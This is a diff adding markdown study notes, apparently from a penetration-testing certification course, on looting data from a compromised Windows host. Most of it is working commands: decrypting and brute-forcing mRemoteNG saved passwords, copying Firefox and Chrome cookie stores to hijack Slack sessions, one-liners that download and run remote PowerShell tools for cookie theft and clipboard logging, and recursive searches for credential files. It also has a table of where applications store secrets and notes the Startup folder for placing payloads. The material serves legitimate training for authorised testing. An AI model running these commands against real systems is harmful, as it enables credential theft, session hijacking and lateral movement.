@@ -1,0 +1,198 @@
+🧠 TL;DR Pillaging Purpose
+Pillaging is the art of looting data from a compromised system to escalate privileges, move laterally, or meet engagement goals. Think: creds, network diagrams, saved configs, backups, IM chats, etc.
+
+🔍 Data Sources to Pillage
+Installed Applications
+
+Services
+
+Web & File Shares
+
+Databases / Active Directory
+
+CA Servers
+
+Messaging Tools (Slack, Teams)
+
+Source Code Repos
+
+Virtualization Platforms
+
+Backups / Logging / Monitoring
+
+Clipboard & Screen Capture
+
+Saved Credentials & Roles
+
+Browser Data / IM Clients
+
+Old Audit Reports
+
+💡 One-Liners for Enumeration
+➤ Installed Applications
+Basic Directory Listing:
+cmd
+Copy
+Edit
+dir "C:\Program Files"
+dir "C:\Program Files (x86)"
+Registry (Full List):
+powershell
+Copy
+Edit
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, InstallLocation
+$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, InstallLocation
+$INSTALLED | ?{ $_.DisplayName -ne $null } | Sort DisplayName -Unique | Format-Table -AutoSize
+➤ mRemoteNG Credentials
+Locate confCons.xml:
+powershell
+Copy
+Edit
+ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
+Decrypt using default password:
+bash
+Copy
+Edit
+python3 mremoteng_decrypt.py -s "<encrypted_password>"
+Decrypt using custom master password:
+bash
+Copy
+Edit
+python3 mremoteng_decrypt.py -s "<encrypted_password>" -p <master_password>
+Brute-force master password:
+bash
+Copy
+Edit
+for pass in $(cat wordlist.txt); do python3 mremoteng_decrypt.py -s "<encrypted_password>" -p $pass 2>/dev/null; done
+➤ Slack / IM Cookie Hijack (Firefox)
+powershell
+Copy
+Edit
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+bash
+Copy
+Edit
+python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
+➤ Slack / IM Cookie Hijack (Chrome)
+Copy to expected location:
+powershell
+Copy
+Edit
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+Extract with SharpChromium:
+powershell
+Copy
+Edit
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+Invoke-SharpChromium -Command "cookies slack.com"
+➤ Clipboard Monitoring
+powershell
+Copy
+Edit
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
+Invoke-ClipboardLogger
+➤ Restore from Backups (Restic)
+View Snapshots:
+powershell
+Copy
+Edit
+restic.exe -r E:\restic2\ snapshots
+Restore Specific Snapshot:
+powershell
+Copy
+Edit
+restic.exe -r E:\restic2\ restore <snapshot_id> --target C:\Restore
+🔥 High-Value Targets to Check in Pillaging
+SAM, SYSTEM, SECURITY hives
+
+.kdbx, .xml, .rdp, .ps1, .config
+
+web.config (credentials often inside)
+
+.ssh/, shadow, authorized_keys (Linux backups)
+
+IM clients (Slack, Teams) for password, creds, secret
+
+Clipboard logs or cookies
+
+Anything saved in ProgramData, AppData, or %USERPROFILE%
+
+🧠 Final Takeaways
+This is real-world gold: Users save everything, and companies rarely harden every app.
+
+If you’ve got creds or cookies from any tool/service, try logging in from your host.
+
+Think of Pillaging as "offensive documentation" — you’re documenting their secrets for later privilege escalation or lateral movement.
+
+
+🔍 What Makes AppData & ProgramData Valuable?
+These folders store:
+
+User app configs (which may include creds)
+
+Tokens, cookies, cached sessions
+
+Logs / backups
+
+Vaults like KeePass, mRemoteNG, WinSCP, RDP
+
+IM clients / browsers
+
+VPN configs
+
+🎯 Targeted Pillaging Cheat Sheet
+Here’s what you check in AppData (per user):
+
+Target	Path	Why
+mRemoteNG	AppData\Roaming\mRemoteNG\confCons.xml	RDP creds (decryptable)
+KeePass	*.kdbx files anywhere	Can hash with keepass2john
+Chrome / Firefox Cookies	AppData\Local\Google\Chrome\User Data
+AppData\Roaming\Mozilla\Firefox\Profiles\	Cookies/tokens for web access
+Slack	Chrome or Firefox profiles	Session cookie d can hijack access
+WinSCP / FileZilla	AppData\Roaming\WinSCP.ini / recentservers.xml	Saved server logins in plaintext
+Microsoft Teams / Outlook	AppData\Roaming\Microsoft\Teams\	Session data, tokens
+PowerShell History	AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt	Command history (sometimes with passwords)
+Autologon	HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon	Cleartext creds in registry
+Sticky Notes	AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite	Saved notes → often passwords
+Here’s what you check in ProgramData (shared across users):
+
+Target	Path	Why
+Docker Desktop (CVE-2019–15752)	ProgramData\DockerDesktop\version-bin\	Writable path → user interaction to execute
+Any app folder	ProgramData\<vendor>\*	Saved configs, logins, service tokens
+Thycotic / CyberArk	ProgramData\<Thycotic>\*	Vault data, potentially configs
+Scripts / Schedulers	ProgramData\Microsoft\Windows\Start Menu\Programs\Startup	Payload placement, often missed
+🧠 So How Do You Know What’s Valuable?
+Ask yourself:
+
+✅ Does the file have extensions like .xml, .config, .ini, .cred, .kdbx, .rdp, .bat, .ps1, .vbs?
+
+✅ Does it contain keywords like:
+password, pwd, username, connection, auth, creds, token?
+
+✅ Is it a known app that might store creds?
+
+🛠 Suggested Workflow
+powershell
+Copy
+Edit
+# Search for high-signal files only
+Get-ChildItem -Path "$env:APPDATA", "$env:LOCALAPPDATA", "C:\ProgramData" -Recurse -Include *.xml,*.ini,*.config,*.kdbx,*.rdp,*.cred,*.bat,*.ps1,*.vbs -ErrorAction SilentlyContinue
+
+# Grep through contents
+Get-ChildItem -Recurse -Include *.xml,*.config,*.txt | Select-String -Pattern "password|username|auth|creds"
+And for faster triage:
+
+powershell
+Copy
+Edit
+Get-ChildItem -Path "C:\Users\*\AppData" -Recurse -Include *.kdbx,*.xml,*.config -ErrorAction SilentlyContinue
+💣 Buck’s Takeaway
+You don’t shotgun everything — you build a pattern recognition mindset.
+
+This part of CPTS is teaching you to think like this:
+
+"I'm on a dev box, they probably use WinSCP or mRemoteNG. Let me check AppData\Roaming for stored session configs."
+
+or
+
+"This is a shared system. Let me peek in ProgramData folders for backup jobs, logs, creds, or scheduler junk."
